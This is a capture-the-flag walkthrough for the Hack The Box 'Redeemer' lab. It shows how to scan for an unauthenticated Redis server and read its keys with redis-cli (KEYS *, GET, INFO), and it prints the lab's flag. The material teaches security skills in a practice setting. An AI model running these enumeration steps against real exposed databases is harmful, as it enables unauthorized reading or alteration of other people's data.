# Redis Enumeration – HTB Starting Point (Redeemer)

## 📌 Overview
Redis is an **in‑memory key–value database** commonly used for caching and fast data storage.  
When exposed without authentication (a common misconfiguration), it allows attackers to read or modify stored data.

This walkthrough documents the enumeration steps used to extract the flag from an exposed Redis instance.

YouTube Tutorial -> https://youtu.be/8XrFz6Tmmus
---

## 🔹 1. Service Identification
Nmap scan revealed Redis running on the default port:

Command: Nmap -p- -sV -sC -T4 <IP> -oN redisnmapoutput.nmap

Redis uses a simple text‑based protocol and can be accessed using the official CLI tool.

---

## 🔹 2. Connecting to Redis

Use the Redis CLI command to connect to the remote host:

redis-cli -h <IP>

---

## 🔹 3. Listing Keys (Equivalent to ls)
Redis stores data as keys, not files.
To list all keys in the current database
KEYS *

Example output:

Code
1) "temp"
2) "flag"
3) "numb"
4) "stor"

## 🔹 4. Retrieving Values
To read the value stored inside a key:

bash
GET <key>
Example:

bash
GET flag
This returns the HTB flag.

## 🔹 5. Checking Key Types (Optional)
Redis supports multiple data types.
To check the type of a key:

bash
TYPE <key>
For HTB Starting Point, keys are typically simple strings.

## 🔹 6. Getting Server Information (INFO)
To view server statistics, configuration, memory usage, and keyspace details:
INFO
This command provides:

Redis version

Uptime

Memory usage

Connected clients

Persistence settings

Number of keys per database

Although not required to solve Redeemer, INFO is essential in real‑world Redis exploitation.

## 🔹 7. Typical Redis Enumeration Workflow
bash
redis-cli -h <IP>   # Connect to Redis
KEYS *              # List all keys
GET <key>           # Retrieve key value
INFO                # View server statistics (optional)

## 🔹 8. Example Output (Redeemer)
Code
KEYS *
1) "temp"
2) "flag"
3) "numb"
4) "stor"

GET flag
"03e1d2b376c37ab3f5319922053953eb"

<img width="1149" height="748" alt="image" src="https://github.com/user-attachments/assets/e49d5863-823b-40ca-a1db-1bafe823c05f" />
